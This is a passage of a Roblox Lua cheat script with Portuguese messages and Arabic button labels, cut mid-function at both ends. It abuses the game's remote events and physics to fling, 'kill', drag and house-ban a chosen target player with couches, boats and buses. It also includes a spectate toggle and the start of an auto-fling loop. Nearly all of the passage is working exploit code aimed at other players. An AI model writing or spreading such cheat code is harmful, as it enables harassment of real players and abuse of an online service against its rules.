    local FPos = function(BasePart, Pos, Ang)
        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
        Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
    end
    
    local SFBasePart = function(BasePart)
        local TimeToWait = 5
        local Time = tick()
        local Angle = 0
        
        repeat
            if RootPart and THumanoid then
                if BasePart.Velocity.Magnitude < 50 then
                    Angle = Angle + 100
                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle),0,0))
                    task.wait()
                else
                    FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0,0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0,0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0,0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90),0,0))
                    task.wait()
                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0,0,0))
                    task.wait()
                end
            else
                break
            end
        until BasePart.Velocity.Magnitude > 500 or not BasePart.Parent or not TargetPlayer.Character or Humanoid.Health <= 0 or tick() > Time + TimeToWait
    end
    
    local BV = Instance.new("BodyVelocity")
    BV.Parent = RootPart
    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
    BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
    
    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    
    if TRootPart and THead then
        if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
            SFBasePart(THead)
        else
            SFBasePart(TRootPart)
        end
    elseif TRootPart then
        SFBasePart(TRootPart)
    elseif THead then
        SFBasePart(THead)
    end
    
    BV:Destroy()
    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
    workspace.CurrentCamera.CameraSubject = Humanoid
    
    task.wait(0.5)
    UnequipCouch()
    
    if originalPosition and RootPart then
        RootPart.CFrame = originalPosition
        RootPart.Velocity = Vector3.new(0, 0, 0)
        RootPart.RotVelocity = Vector3.new(0, 0, 0)
    end
    
    task.wait(0.3)
    ClearAllTools()
    workspace.FallenPartsDestroyHeight = -500
end

local function KillCouch(target)
    -- VERIFICAÇÃO DE SEAT REMOVIDA - Agora funciona mesmo se o alvo estiver sentado
    
    local RootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not RootPart then return end
    
    local originalPosition = RootPart.CFrame
    workspace.FallenPartsDestroyHeight = 0/0
    
    if not GetAndEquipCouch() then
        SendNotification("Erro", "Não foi possível equipar sofá")
        workspace.FallenPartsDestroyHeight = -500
        return
    end
    
    while not target.Character do task.wait(0.1) end
    SkidFling(target, originalPosition)
end


local function BringCouch(target)
    if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
        SendNotification("Erro", "Jogador alvo sem personagem")
        return
    end

    SendNotification("Iniciando", "Trazendo " .. target.Name .. " com Couch...")

    local args = { [1] = "ClearAllTools" }
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))
    
    local args = { [1] = "PickingTools", [2] = "Couch" }
    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)
    if not couch then
        SendNotification("Erro", "Sofá não encontrado no Backpack")
        return
    end

    couch.Name = "Chaos.Couch"
    local seat1 = couch:FindFirstChild("Seat1")
    local seat2 = couch:FindFirstChild("Seat2")
    local handle = couch:FindFirstChild("Handle")
    
    if seat1 and seat2 and handle then
        seat1.Disabled = true
        seat2.Disabled = true
        handle.Name = "Handle "
    else
        SendNotification("Erro", "Componentes do sofá não encontrados")
        return
    end
    
    couch.Parent = LocalPlayer.Character

    local tet = Instance.new("BodyVelocity", seat1)
    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    tet.P = 1250
    tet.Velocity = Vector3.new(0, 0, 0)
    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    repeat
        for m = 1, 35 do
            local pos = { x = 0, y = 0, z = 0 }
            local tRoot = target.Character and target.Character.HumanoidRootPart
            if not tRoot then break end
            
            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)
            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)
            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)
            
            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)
            task.wait()
        end
        
        tet:Destroy()
        couch.Parent = LocalPlayer.Backpack
        task.wait()
        couch:FindFirstChild("Handle ").Name = "Handle"
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        task.wait()
        couch.Parent = LocalPlayer.Backpack
        couch.Handle.Name = "Handle "
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        
        tet = Instance.new("BodyVelocity", seat1)
        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        tet.P = 1250
        tet.Velocity = Vector3.new(0, 0, 0)
        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
        
    until target.Character and target.Character.Humanoid and target.Character.Humanoid.Sit == true

    task.wait()
    tet:Destroy()
    couch.Parent = LocalPlayer.Backpack
    task.wait()
    couch:FindFirstChild("Handle ").Name = "Handle"
    task.wait(0.3)
    couch.Parent = LocalPlayer.Character
    task.wait(0.3)
    couch.Grip = CFrame.new(Vector3.new(0, 0, 0))
    task.wait(0.3)
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
    
    SendNotification("Sucesso", target.Name .. " foi trazido!")
end


local function KillVehicle(target, vehicleType)
    -- VERIFICAÇÃO DE SEAT REMOVIDA
    
    local character = LocalPlayer.Character
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    
    if not humanoidRootPart or not humanoid then return end
    
    local originalPosition = humanoidRootPart.CFrame
    local Vehicles = workspace:FindFirstChild("Vehicles")
    
    if vehicleType == "Boat" then
        humanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        pcall(function()
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
        end)
    elseif vehicleType == "PoliceBoat" then
        humanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        pcall(function()
            local args = {"PickingBoat", "PoliceBoatChangeable"}
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
        end)
    else
        humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
        task.wait(0.5)
        pcall(function()
            local args = vehicleType == "Bus" and {"PickingCar", "SchoolBus"} or {"PickingCar", "TowTruck"}
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
        end)
    end
    
    task.wait(1.5)
    
    local vehicle = Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
    if not vehicle then
        humanoidRootPart.CFrame = originalPosition
        return
    end
    
    local seat
    if vehicleType == "Boat" or vehicleType == "PoliceBoat" then
        seat = vehicle:FindFirstChild("Body") and vehicle.Body:FindFirstChild("VehicleSeat")
    else
        seat = vehicle:FindFirstChild("Seats") and vehicle.Seats:FindFirstChild("VehicleSeat")
        if not seat then
            seat = vehicle:FindFirstChild("Body") and vehicle.Body:FindFirstChild("VehicleSeat")
        end
    end
    
    if not seat then
        DeleteAllVehicles()
        humanoidRootPart.CFrame = originalPosition
        return
    end
    
    local attempts = 0
    repeat
        humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
        task.wait(0.1)
        attempts = attempts + 1
    until humanoid.Sit or attempts > 50 or not vehicle.Parent
    
    if not humanoid.Sit then
        DeleteAllVehicles()
        humanoidRootPart.CFrame = originalPosition
        return
    end
    
    for _, container in pairs({vehicle:FindFirstChild("Body"), vehicle:FindFirstChild("Seats")}) do
        if container then
            for _, v in pairs(container:GetChildren()) do
                if v:IsA("Seat") or v:IsA("VehicleSeat") then
                    v.CanTouch = false
                end
            end
        end
    end
    
    workspace.FallenPartsDestroyHeight = 0/0
    
    local Spin
    if vehicleType == "Boat" or vehicleType == "PoliceBoat" then
        Spin = Instance.new("BodyAngularVelocity")
        Spin.Parent = vehicle.PrimaryPart
        Spin.MaxTorque = Vector3.new(0, math.huge, 0)
        Spin.AngularVelocity = Vector3.new(0, 200, 0)
    end
    
    local flingActive = true
    local targetInVoid = false
    
    task.spawn(function()
        local startTime = tick()
        local maxTime = (vehicleType == "Boat" or vehicleType == "PoliceBoat") and 15 or 20
        
        while flingActive and vehicle and vehicle.Parent do
            local targetChar = target.Character
            if not targetChar then break end
            
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
            
            if not targetRoot or not targetHumanoid or targetHumanoid.Health <= 0 then break end
            
            if targetRoot.Position.Y < -100 then
                targetInVoid = true
                break
            end
            
            -- BLOCO DE VERIFICAÇÃO DE SEAT REMOVIDO - Continua fling mesmo se sentar
            
            if vehicleType == "Boat" or vehicleType == "PoliceBoat" then
                local angle = (tick() - startTime) * 50
                if targetRoot.Velocity.Magnitude < 50 then
                    local movePatterns = {
                        {pos = CFrame.new(0, 1.5, 0) + targetHumanoid.MoveDirection * targetRoot.Velocity.Magnitude / 2, rot = CFrame.Angles(math.rad(angle), 0, 0)},
                        {pos = CFrame.new(0, -1.5, 0) + targetHumanoid.MoveDirection * targetRoot.Velocity.Magnitude / 2, rot = CFrame.Angles(math.rad(angle), 0, 0)},
                        {pos = CFrame.new(1.5, 1.5, -1.5) + targetHumanoid.MoveDirection * targetRoot.Velocity.Magnitude / 2, rot = CFrame.Angles(math.rad(angle), 0, 0)},
                        {pos = CFrame.new(-1.5, -1.5, 1.5) + targetHumanoid.MoveDirection * targetRoot.Velocity.Magnitude / 2, rot = CFrame.Angles(math.rad(angle), 0, 0)},
                    }
                    for _, pattern in ipairs(movePatterns) do
                        if not flingActive then break end
                        pcall(function()
                            vehicle:SetPrimaryPartCFrame(CFrame.new(targetRoot.Position) * pattern.pos * pattern.rot)
                        end)
                        task.wait(0.1)
                    end
                else
                    local speedPatterns = {
                        CFrame.new(0, 1.5, targetHumanoid.WalkSpeed),
                        CFrame.new(0, -1.5, -targetHumanoid.WalkSpeed),
                        CFrame.new(0, 1.5, targetRoot.Velocity.Magnitude / 2),
                        CFrame.new(0, -1.5, -targetRoot.Velocity.Magnitude / 2),
                    }
                    for _, offset in ipairs(speedPatterns) do
                        if not flingActive then break end
                        pcall(function()
                            vehicle:SetPrimaryPartCFrame(CFrame.new(targetRoot.Position) * offset * CFrame.Angles(math.rad(90), 0, 0))
                        end)
                        task.wait(0.1)
                    end
                end
                task.wait(0.05)
            else
                local time = tick() * 35
                local lateralOffset = math.sin(time) * 4
                local frontBackOffset = math.cos(time) * 20
                pcall(function()
                    vehicle:SetPrimaryPartCFrame(targetRoot.CFrame * CFrame.new(lateralOffset, 0, frontBackOffset))
                end)
            end
            
            if tick() - startTime > maxTime then break end
            RunService.RenderStepped:Wait()
        end
        flingActive = false
    end)
    
    while flingActive do task.wait(0.1) end
    
    if Spin then Spin:Destroy() end
    
    task.wait(0.3)
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
    
    task.wait(0.7)
    if humanoidRootPart then
        humanoidRootPart.CFrame = originalPosition
        humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
        humanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
    end
    
    task.wait(0.5)
    DeleteAllVehicles()
    workspace.FallenPartsDestroyHeight = -500
    
    if targetInVoid then
        SendNotification("Sucesso", "Kill executado!")
    else
        SendNotification("Concluído", "Fling finalizado")
    end
end


local function BringVehicle(target, vehicleType)
    local character = LocalPlayer.Character
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    
    if not humanoidRootPart or not humanoid then return end
    
    local originalPosition = humanoidRootPart.CFrame
    local Vehicles = workspace:FindFirstChild("Vehicles")
    
    if vehicleType == "Boat" then
        humanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        pcall(function()
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
        end)
    elseif vehicleType == "PoliceBoat" then
        humanoidRootPart.CFrame = CFrame.new(1754, -2, 58)
        task.wait(0.5)
        pcall(function()
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "PoliceBoatChangeable")
        end)
    else
        humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
        task.wait(0.5)
        pcall(function()
            local args = vehicleType == "Bus" and {"PickingCar", "SchoolBus"} or {"PickingCar", "TowTruck"}
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(args))
        end)
    end
    
    task.wait(1.5)
    
    local vehicle = Vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
    if not vehicle then
        humanoidRootPart.CFrame = originalPosition
        SendNotification("Erro", "Veículo não spawnou")
        return
    end
    
    local seats = {}
    for _, container in pairs({vehicle:FindFirstChild("Body"), vehicle:FindFirstChild("Seats")}) do
        if container then
            for _, v in pairs(container:GetChildren()) do
                if v:IsA("Seat") or v:IsA("VehicleSeat") then
                    table.insert(seats, v)
                end
            end
        end
    end
    
    if #seats == 0 then
        DeleteAllVehicles()
        humanoidRootPart.CFrame = originalPosition
        SendNotification("Erro", "Nenhum assento encontrado")
        return
    end
    
    local mySeat = seats[1]
    
    local attempts = 0
    repeat
        humanoidRootPart.CFrame = mySeat.CFrame * CFrame.new(0, 2, 0)
        task.wait(0.1)
        attempts = attempts + 1
    until humanoid.Sit or attempts > 50 or not vehicle.Parent
    
    if not humanoid.Sit then
        DeleteAllVehicles()
        humanoidRootPart.CFrame = originalPosition
        SendNotification("Erro", "Não conseguiu sentar")
        return
    end
    
    workspace.FallenPartsDestroyHeight = 0/0
    
    local flingActive = true
    local brought = false
    
    task.spawn(function()
        local startTime = tick()
        local maxTime = 30
        
        while flingActive and vehicle and vehicle.Parent do
            local targetChar = target.Character
            if not targetChar then break end
            
            local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
            local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
            
            if not targetRoot or not targetHumanoid or targetHumanoid.Health <= 0 then break end
            
            if targetHumanoid.Sit then
                SendNotification("Alvo Sentou!", "Trazendo SUPER RÁPIDO...")
                
                for i = 1, 30 do
                    pcall(function()
                        vehicle:SetPrimaryPartCFrame(originalPosition * CFrame.new(0, 5, -3))
                    end)
                    task.wait(0.03)
                    
                    local distance = (targetRoot.Position - originalPosition.Position).Magnitude
                    if distance < 10 then
                        brought = true
                        SendNotification("Sucesso", "Player trazido!")
                        break
                    end
                end
                break
            end
            
            local distance = (targetRoot.Position - originalPosition.Position).Magnitude
            if distance < 10 then
                brought = true
                SendNotification("Sucesso", "Player trazido!")
                break
            end
            
            pcall(function()
                for idx, seat in pairs(seats) do
                    local angle = (tick() * 100 + (idx * 60)) % 360
                    local rad = math.rad(angle)
                    local offsetX = math.cos(rad) * 3
                    local offsetZ = math.sin(rad) * 3
                    
                    seat.CFrame = targetRoot.CFrame * CFrame.new(offsetX, 2, offsetZ)
                    seat.Velocity = Vector3.new(0, 50, 0)
                    seat.CanTouch = false
                end
            end)
            
            if tick() - startTime > maxTime then 
                SendNotification("Tempo Esgotado", "Tente novamente")
                break 
            end
            
            RunService.RenderStepped:Wait()
        end
        flingActive = false
    end)
    
    while flingActive do task.wait(0.1) end
    
    task.wait(0.3)
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
    
    task.wait(0.7)
    if humanoidRootPart then
        humanoidRootPart.CFrame = originalPosition
        humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
        humanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
    end
    
    task.wait(0.5)
    DeleteAllVehicles()
    workspace.FallenPartsDestroyHeight = -500
end


flingsTab:AddButton({
    Name = "قتل باند بيت",
    Callback = function()
        if not lockedTarget or lockedTarget == "" then
            SendNotification("Erro", "Selecione um alvo primeiro!")
            return
        end
        
        local selectedPlayer = Players:FindFirstChild(lockedTarget)
        if not selectedPlayer or not selectedPlayer.Character then
            SendNotification("Erro", "Alvo não encontrado!")
            return
        end
        
        SendNotification("House Ban", "Iniciando processo...")
        
        local Player = LocalPlayer
        local Character = Player.Character
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Houses = workspace:FindFirstChild("001_Lots")
        local OldPos = RootPart.CFrame
        
        if not (Character and RootPart and Houses) then
            SendNotification("Erro", "Personagem inválido!")
            return
        end
        
        local MyHouse = Houses:FindFirstChild(Player.Name .. "House")
        
        if not MyHouse then
            SendNotification("House Ban", "Comprando casa...")
            
            local availableHouses = {}
            for _, Lot in pairs(Houses:GetChildren()) do
                if Lot.Name == "For Sale" then
                    for _, num in pairs(Lot:GetDescendants()) do
                        if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                            table.insert(availableHouses, {Lot = Lot, Number = num.Value})
                            break
                        end
                    end
                end
            end
            
            if #availableHouses == 0 then
                SendNotification("Erro", "Nenhuma casa disponível!")
                return
            end
            
            local randomHouse = availableHouses[math.random(1, #availableHouses)]
            local houseNumber = randomHouse.Number
            
            local BuyDetector = randomHouse.Lot:FindFirstChild("BuyHouse")
            if BuyDetector then
                RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0, -6, 0)
                task.wait(0.3)
                local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                if ClickDetector then
                    fireclickdetector(ClickDetector)
                end
            end
            
            task.wait(0.5)
            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):FireServer(houseNumber, "056_House")
            end)
            
            task.wait(1)
            MyHouse = Houses:FindFirstChild(Player.Name .. "House")
        end
        
        if MyHouse then
            for _, x in pairs(MyHouse:GetDescendants()) do
                if x.Name == "Number" and x:IsA("NumberValue") then
                    task.wait(0.3)
                    pcall(function()
                        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse", "049_House", x.Value)
                    end)
                    break
                end
            end
        end
        
        task.wait(1)
        MyHouse = Houses:FindFirstChild(Player.Name .. "House")
        
        if not MyHouse then
            SendNotification("Erro", "Falha ao criar casa!")
            RootPart.CFrame = OldPos
            return
        end
        
        SendNotification("House Ban", "Casa pronta!")
        
        local HouseSpawn = MyHouse:FindFirstChild("HouseSpawnPosition")
        if not HouseSpawn then
            SendNotification("Erro", "Spawn não encontrado!")
            return
        end
        
        RootPart.CFrame = CFrame.new(HouseSpawn.Position) + Vector3.new(0, 3, 0)
        task.wait(0.5)
        
        SendNotification("House Ban", "Iniciando Bring com Couch...")
        
        pcall(function()
            ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
        end)
        task.wait(0.3)
        
        pcall(function()
            ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
        end)
        task.wait(0.5)

        local couch = LocalPlayer.Backpack:WaitForChild("Couch", 3)
        if not couch then
            SendNotification("Erro", "Sofá não encontrado")
            RootPart.CFrame = OldPos
            return
        end

        couch.Name = "HouseBan.Couch"
        local seat1 = couch:FindFirstChild("Seat1")
        local seat2 = couch:FindFirstChild("Seat2")
        local handle = couch:FindFirstChild("Handle")
        
        if not (seat1 and seat2 and handle) then
            SendNotification("Erro", "Componentes do sofá não encontrados")
            return
        end
        
        seat1.Disabled = true
        seat2.Disabled = true
        handle.Name = "Handle "
        
        couch.Parent = LocalPlayer.Character
        task.wait(0.2)

        local tet = Instance.new("BodyVelocity", seat1)
        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        tet.P = 1250
        tet.Velocity = Vector3.new(0, 0, 0)
        tet.Name = "#HOUSEBANBRING"

        SendNotification("House Ban", "Trazendo " .. selectedPlayer.Name .. "...")
        
        local bringAttempts = 0
        local maxBringAttempts = 3
        
        repeat
            for m = 1, 35 do
                local tRoot = selectedPlayer.Character and selectedPlayer.Character.HumanoidRootPart
                if not tRoot then break end
                
                local pos = {
                    x = tRoot.Position.X + (tRoot.Velocity.X / 2),
                    y = tRoot.Position.Y + (tRoot.Velocity.Y / 2),
                    z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)
                }
                
                seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)
                task.wait()
            end
            
            tet:Destroy()
            couch.Parent = LocalPlayer.Backpack
            task.wait()
            couch:FindFirstChild("Handle ").Name = "Handle"
            task.wait(0.2)
            couch.Parent = LocalPlayer.Character
            task.wait()
            couch.Parent = LocalPlayer.Backpack
            couch.Handle.Name = "Handle "
            task.wait(0.2)
            couch.Parent = LocalPlayer.Character
            
            tet = Instance.new("BodyVelocity", seat1)
            tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            tet.P = 1250
            tet.Velocity = Vector3.new(0, 0, 0)
            tet.Name = "#HOUSEBANBRING"
            
            bringAttempts = bringAttempts + 1
            
        until (selectedPlayer.Character and selectedPlayer.Character.Humanoid and selectedPlayer.Character.Humanoid.Sit == true) or bringAttempts >= maxBringAttempts

        task.wait()
        if tet then tet:Destroy() end
        couch.Parent = LocalPlayer.Backpack
        task.wait()
        if couch:FindFirstChild("Handle ") then
            couch:FindFirstChild("Handle ").Name = "Handle"
        end
        task.wait(0.3)
        couch.Parent = LocalPlayer.Character
        task.wait(0.3)
        couch.Grip = CFrame.new(Vector3.new(0, 0, 0))
        task.wait(0.3)
        pcall(function()
            ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
        end)
        
        SendNotification("House Ban", "Bring finalizado! Aguardando alvo...")
        
        local HouseModel = MyHouse:FindFirstChild("HousePickedByPlayer")
        if HouseModel then
            HouseModel = HouseModel:FindFirstChild("HouseModel")
        end
        
        if not HouseModel then
            SendNotification("Erro", "HouseModel não encontrado!")
            RootPart.CFrame = OldPos
            return
        end
        
        local DisallowRemote = HouseModel:FindFirstChild("Permissions:Disallow")
        if not DisallowRemote then
            SendNotification("Erro", "Remote de ban não encontrado!")
            RootPart.CFrame = OldPos
            return
        end
        
        local bannedSuccessfully = false
        local startDetection = tick()
        local maxDetectionTime = 30
        
        while not bannedSuccessfully and (tick() - startDetection) < maxDetectionTime do
            if RootPart then
                RootPart.CFrame = CFrame.new(HouseSpawn.Position) + Vector3.new(0, 3, 0)
            end
            
            if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local targetHRP = selectedPlayer.Character.HumanoidRootPart
                local distance = (targetHRP.Position - HouseSpawn.Position).Magnitude
                
                if distance < 50 then
                    SendNotification("House Ban", "ALVO NA CASA! Banindo...")
                    
                    pcall(function()
                        local args = {selectedPlayer}
                        DisallowRemote:FireServer(unpack(args))
                    end)
                    
                    task.wait(1)
                    
                    if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local newDistance = (selectedPlayer.Character.HumanoidRootPart.Position - HouseSpawn.Position).Magnitude
                        if newDistance > 80 then
                            bannedSuccessfully = true
                            SendNotification("SUCESSO!", selectedPlayer.Name .. " FOI BANIDO DA CASA!")
                        else
                            pcall(function()
                                DisallowRemote:FireServer(selectedPlayer)
                            end)
                        end
                    else
                        bannedSuccessfully = true
                        SendNotification("SUCESSO!", selectedPlayer.Name .. " foi removido!")
                    end
                    
                    if bannedSuccessfully then
                        break
                    end
                end
            end
            
            task.wait(0.3)
        end
        
        if not bannedSuccessfully then
            SendNotification("House Ban", "⏱️ Timeout - Alvo não entrou a tempo")
        end
        
        task.wait(1)
        ClearAllTools()
        
        task.wait(0.5)
        if RootPart then
            RootPart.CFrame = OldPos
        end
        
        SendNotification("House Ban", "Processo finalizado!")
    end
})


flingsTab:AddButton({
    Name = "قتل",
    Callback = function()
        if not selectedPlayerName or selectedPlayerName == "" then
            SendNotification("Erro", "Selecione um jogador")
            return
        end
        
        local target = Players:FindFirstChild(selectedPlayerName)
        if not target then
            SendNotification("Erro", "Jogador não encontrado")
            return
        end
        
        -- VERIFICAÇÃO DE SEAT REMOVIDA - Agora funciona sempre
        
        if selectedMethod == "كرة قدم" then
            FlingBall(target)
        elseif selectedMethod == "كنبة" then
            KillCouch(target)
        elseif selectedMethod == "قارب" then
            KillVehicle(target, "Boat")
        elseif selectedMethod == "قارب شرطة" then
            KillVehicle(target, "PoliceBoat")
        elseif selectedMethod == "باص" then
            KillVehicle(target, "Bus")
        elseif selectedMethod == "جرارة" then
            KillVehicle(target, "TowTruck")
        end
    end
})

flingsTab:AddButton({
    Name = "سحب",
    Callback = function()
        if not selectedPlayerName or selectedPlayerName == "" then
            SendNotification("Erro", "Selecione um jogador")
            return
        end
        
        local target = Players:FindFirstChild(selectedPlayerName)
        if not target then
            SendNotification("Erro", "Jogador não encontrado")
            return
        end
        
        SendNotification("Iniciando", "Trazendo " .. target.Name .. "...")
        
        if selectedMethod == "كنبة" then
            BringCouch(target)
        elseif selectedMethod == "قارب" then
            BringVehicle(target, "Boat")
        elseif selectedMethod == "قارب شرطة" then
            BringVehicle(target, "PoliceBoat")
        elseif selectedMethod == "باص" then
            BringVehicle(target, "Bus")
        elseif selectedMethod == "جرارة" then
            BringVehicle(target, "TowTruck")
        else
            SendNotification("Erro", "Método não suporta Bring")
        end
    end
})

flingsTab:AddButton({
    Name = "انتقال",
    Callback = function()
        if not selectedPlayerName then return end
        local target = Players:FindFirstChild(selectedPlayerName)
        if target and target.Character then
            local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
            if myHRP and targetHRP then
                myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
            end
        end
    end
})


local viewActive = false
local viewConnection

flingsTab:AddToggle({
    Name = "مشاهدة",
    Default = false,
    Callback = function(value)
        viewActive = value
        
        if value then
            if not lockedTarget or lockedTarget == "" then
                SendNotification("View", "ERRO: Selecione um alvo primeiro!")
                viewActive = false
                return
            end
            
            SendNotification("View", "Ativado em " .. lockedTarget)
            
            -- Loop FORÇADO que mantém o view sempre ativo
            viewConnection = RunService.Heartbeat:Connect(function()
                if not viewActive then return end
                
                local target = Players:FindFirstChild(lockedTarget)
                if target and target.Character then
                    local hum = target.Character:FindFirstChild("Humanoid")
                    if hum then
                        workspace.CurrentCamera.CameraSubject = hum
                    end
                end
            end)
        else
            -- Desativa o view
            if viewConnection then
                viewConnection:Disconnect()
                viewConnection = nil
            end
            
            if LocalPlayer.Character then
                local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
                if hum then
                    workspace.CurrentCamera.CameraSubject = hum
                end
            end
            SendNotification("View", "Desativado")
        end
    end
})

local autoFlingActive = false

flingsTab:AddToggle({
    Name = "تطيير تلقائي بالاداة اللي احتاريتها",
    Default = false,
    Callback = function(value)
        autoFlingActive = value
        
        if value then
            -- Verifica se há alvo travado
            if not lockedTarget or lockedTarget == "" then
                SendNotification("Auto Fling", "ERRO: Selecione um alvo primeiro!")
                autoFlingActive = false
                return
            end
            
            local target = Players:FindFirstChild(lockedTarget)
            if not target then
                SendNotification("Auto Fling", "ERRO: Alvo não está no servidor!")
                autoFlingActive = false
                return
            end
            
            SendNotification("Auto Fling", "ATIVADO - Alvo: " .. lockedTarget)
            
            -- Loop infinito
            task.spawn(function()
